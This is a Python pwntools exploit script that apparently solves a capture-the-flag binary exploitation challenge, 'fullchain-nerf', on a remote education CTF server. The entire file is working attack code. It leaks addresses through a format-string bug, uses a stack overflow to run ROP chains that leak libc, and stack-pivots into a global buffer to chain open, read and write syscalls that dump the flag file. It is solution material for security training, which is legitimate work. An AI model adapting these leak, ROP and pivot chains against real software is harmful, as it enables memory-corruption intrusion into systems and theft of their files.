from pwn import *
import binascii
context.arch= 'amd64'
context.terminal = ['tmux', 'splitw', '-v']

# r = process('./fullchain-nerf')
r = remote('edu-ctf.zoolab.org', 30206)

elf = ELF('./fullchain-nerf')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')


# get the base address of ELF
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
r.send(b'%6$p') # FSB
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'write')
elf_base = int(r.recvuntil(b'g')[:-1], 16) - elf.sym['__libc_csu_init']
print(f'elf_base: {hex(elf_base)}')

# get the base address of libc
pop_rdi_ret = elf_base + 0x16d3
puts_got = elf_base + elf.got['puts']
puts_plt = elf_base + elf.plt['puts']
chal = elf_base + elf.sym['chal']
rop1 = flat( 
    pop_rdi_ret, puts_got,
    puts_plt, chal
)
r.sendlineafter('lobal or local > ', b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
r.send(b'A'*0x20 + p64(0) + b'A'*0x10 + rop1)
r.recv(5) # discard 'Bye ~'
libc_base = u64(r.recv(8)[1:7] + b'\x00\x00') - libc.sym['puts']
print(f'libc_base: {hex(libc_base)}')

# get the old rbp address for back from stack pivoting
r.sendlineafter('lobal or local > ', b'global')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
r.send(b'%8$p')
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'write')
rbp = int(r.recvuntil(b'g')[:-1], 16)
print(f'rbp: {hex(rbp)}')
r.sendlineafter('lobal or local > ', b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
r.send(b'A'*0x20 + p32(10)*2)

# define some gadgets
pop_rax_ret = libc_base + 0x4a550
pop_rdi_ret = libc_base + 0x26b72
pop_rsi_ret = libc_base + 0x27529
pop_rax_pop_rdx_pop_rbx_ret = libc_base + 0x162865
syscall_ret = libc_base + 0x66229
leave_ret = libc_base + 0x5aa48
global_var = elf_base + elf.sym['global'] # for stack pivoting
pop_rsp_ret = libc_base + 0x32b5a # used to back from stack pivoting

# open('/home/fullchain-nerf/flag', 0) => fd = 3
rop2 = flat(
    pop_rax_ret, 2,
    pop_rdi_ret, rbp - 0x30,
    pop_rsi_ret, 0,
    syscall_ret,
    pop_rsp_ret, rbp + 0x10,
)
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
r.send(b'A'*8 + rop2)
# Stack pivoting to global variable
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
fn = b'/home/fullchain-nerf/flag\x00'
# fn = b'./flag'
payload = fn
payload = payload.ljust(0x30, b'\x00') + p64(global_var) + p64(leave_ret) + p64(chal)
r.send(payload)

# read(3, buf, 0x30)
rop3 = flat(  
    pop_rdi_ret, 3,
    pop_rsi_ret, rbp-0x200,
    pop_rax_pop_rdx_pop_rbx_ret, 0, 0x30, 0,
    syscall_ret,
    pop_rsp_ret, rbp + 0x20,
)
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
r.send(b'A'*8 + rop3)
# Stack pivoting to global variable
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
payload = b'A'*0x20 + p64(0)*2 + p64(global_var) + p64(leave_ret) + p64(chal)
r.send(payload)

# write(1, buf, 0x30)
rop4 = flat(
    pop_rdi_ret, 1,
    pop_rsi_ret, rbp-0x200,
    pop_rax_pop_rdx_pop_rbx_ret, 1, 0x30, 0,
    syscall_ret,
    pop_rsp_ret, rbp + 0x30,
)
r.sendlineafter('global or local > ', b'global')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
r.send(b'A'*8 + rop4)
# Stack pivoting to global variable
r.sendlineafter('global or local > ', b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter('length > ', b'96')
payload = b'A'*0x20 + p64(0)*2 + p64(global_var) + p64(leave_ret) + p64(pop_rax_ret) + p64(1) + p64(syscall_ret)
# gdb.attach(r)
r.send(payload)

r.interactive()
